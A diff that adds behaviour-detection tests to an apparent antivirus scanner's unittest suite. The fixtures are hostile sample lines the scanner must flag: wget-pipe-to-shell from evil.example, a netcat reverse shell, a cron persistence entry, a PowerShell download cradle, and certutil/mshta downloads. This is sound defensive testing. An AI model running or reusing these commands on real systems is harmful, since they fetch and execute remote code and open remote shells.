@@ -276,6 +276,131 @@ class SignatureDBTests(unittest.TestCase):
             db.add(Signature(id="T3", name="T3", category="test", severity="low"))
 
 
+class BehaviorTests(unittest.TestCase):
+    def setUp(self):
+        path = Path(tempfile.mkdtemp(prefix="av-beh-"))
+        self.addCleanup(lambda: shutil.rmtree(path, ignore_errors=True))
+        self.base = path
+        self.db = SignatureDB(path / "sig.json")  # empty db is fine
+        self.scanner = Scanner(Config(), self.db, threads=1)
+
+    def _scan(self, name: str, content, mode: str = "text") -> list:
+        p = self.base / name
+        if mode == "text":
+            p.write_text(content)
+        else:
+            p.write_bytes(content)
+        return self.scanner.scan_file(p)
+
+    def _behavior(self, findings) -> list:
+        return [f for f in findings if f.kind == "behavior"]
+
+    def test_python_indicators(self):
+        src = (
+            "import base64, os, socket, subprocess\n"
+            "os.system('id')\n"
+            "subprocess.run('whoami', shell=True)\n"
+            "s = socket.socket()\n"
+            "s.connect(('10.0.0.9', 4444))\n"
+            "exec(base64.b64decode('aGVsbG8='))\n"
+        )
+        names = {f.name for f in self._behavior(self._scan("x.py", src))}
+        self.assertIn("Shell command execution", names)
+        self.assertIn("Subprocess with shell=True", names)
+        self.assertIn("Hardcoded network target", names)
+        self.assertIn("Dynamic code execution (exec)", names)
+        self.assertIn("Encoded payload handling", names)
+
+    def test_python_constant_eval_not_flagged(self):
+        src = "print(eval('1 + 1'))\n"
+        names = {f.name for f in self._behavior(self._scan("c.py", src))}
+        self.assertNotIn("Dynamic code execution (eval)", names)
+
+    def test_python_unparseable_falls_back_to_regex(self):
+        src = "def broken(:\n  exec(base64.b64decode(x))\n"
+        findings = self._behavior(self._scan("broken.py", src))
+        self.assertTrue(any("Dynamic code execution" in f.name for f in findings))
+
+    def test_shell_indicators(self):
+        sh = (
+            "#!/bin/sh\n"
+            "wget -qO- http://evil.example/x.sh | sh\n"
+            "nc -e /bin/sh 10.0.0.9 4444\n"
+            "echo '* * * * * /tmp/x' >> /etc/cron.d/miner\n"
+            "echo x | base64 -d | bash\n"
+        )
+        names = {f.name for f in self._behavior(self._scan("s.sh", sh))}
+        self.assertIn("Downloads a remote script and pipes it into a shell", names)
+        self.assertIn("netcat with exec flag (reverse shell)", names)
+        self.assertIn("Persistence mechanism (cron / service / shell rc / startup)", names)
+        self.assertIn("Decodes embedded base64 and pipes it into a shell", names)
+
+    def test_powershell_indicators(self):
+        ps = (
+            "IEX (New-Object Net.WebClient).DownloadString('http://x.example/a')\n"
+            "$a = \"-ExecutionPolicy Bypass\"\n"
+            "$t = New-Object System.Net.Sockets.TcpClient('10.0.0.9', 4444)\n"
+        )
+        names = {f.name for f in self._behavior(self._scan("a.ps1", ps))}
+        self.assertIn("Download & execute", names)
+        self.assertIn("Execution policy bypass", names)
+        self.assertIn("Raw socket usage", names)
+
+    def test_batch_indicators(self):
+        bat = (
+            "@echo off\n"
+            "certutil -urlcache -f -split http://x.example/d.exe %%TEMP%%\\d.exe\n"
+            "mshta http://x.example/x.hta\n"
+        )
+        names = {f.name for f in self._behavior(self._scan("d.bat", bat))}
+        self.assertIn("certutil URL download (LOLBin)", names)
+        self.assertIn("mshta remote/HTA script execution (LOLBin)", names)
+
+    def test_pe_dangerous_imports(self):
+        from antivirus.samples import SUSPICIOUS_PE_DLLS, build_sample_pe
+
+        findings = self._behavior(self._scan("a.exe", build_sample_pe(SUSPICIOUS_PE_DLLS), mode="bytes"))
+        names = {f.name for f in findings}
+        self.assertIn("PE imports: Process-injection API set (remote alloc + write + thread)", names)
+        self.assertIn("PE downloads AND executes code", names)
+        sevs = {f.name: f.severity for f in findings}
+        self.assertEqual(sevs["PE downloads AND executes code"], "high")
+
+    def test_pe_benign_imports_clean(self):
+        from antivirus.samples import BENIGN_PE_DLLS, build_sample_pe
+
+        self.assertEqual(self._behavior(self._scan("b.exe", build_sample_pe(BENIGN_PE_DLLS), mode="bytes")), [])
+
+    def test_non_executable_document_not_analysed(self):
+        # Same dangerous text, but in a .txt document -> not executable-looking.
+        findings = self._scan("notes.txt", "curl http://x.example/x.sh | sh\n")
+        self.assertEqual(self._behavior(findings), [])
+        self.assertEqual(findings, [])
+
+    def test_suid_executable_flagged(self):
+        p = self.base / "suid.sh"
+        p.write_text("#!/bin/sh\necho hi\n")
+        os.chmod(p, 0o4755)
+        names = {f.name for f in self._behavior(self.scanner.scan_file(p))}
+        self.assertIn("setuid executable", names)
+
+    def test_behavior_can_be_disabled(self):
+        sh = self.base / "s.sh"
+        sh.write_text("curl http://x.example/x.sh | sh\n")
+        self.assertTrue(self._behavior(self.scanner.scan_file(sh)))
+        self.scanner.config.behavior_enabled = False
+        self.assertEqual(self._behavior(self.scanner.scan_file(sh)), [])
+
+    def test_large_file_skips_behavior_but_still_hashes(self):
+        big = self.base / "big.sh"
+        with open(big, "wb") as fh:
+            fh.write(b"#!/bin/sh\n" + b"a" * (self.scanner.config.behavior_max_size + 1))
+        findings = self.scanner.scan_file(big)
+        # behaviour skipped (file > behaviour_max_size), hash layer still ran
+        self.assertEqual(findings, [])
+        self.assertGreater(big.stat().st_size, self.scanner.config.behavior_max_size)
+
+
 class MiscTests(unittest.TestCase):
     def test_shannon_entropy(self):
         self.assertEqual(shannon_entropy(b""), 0.0)
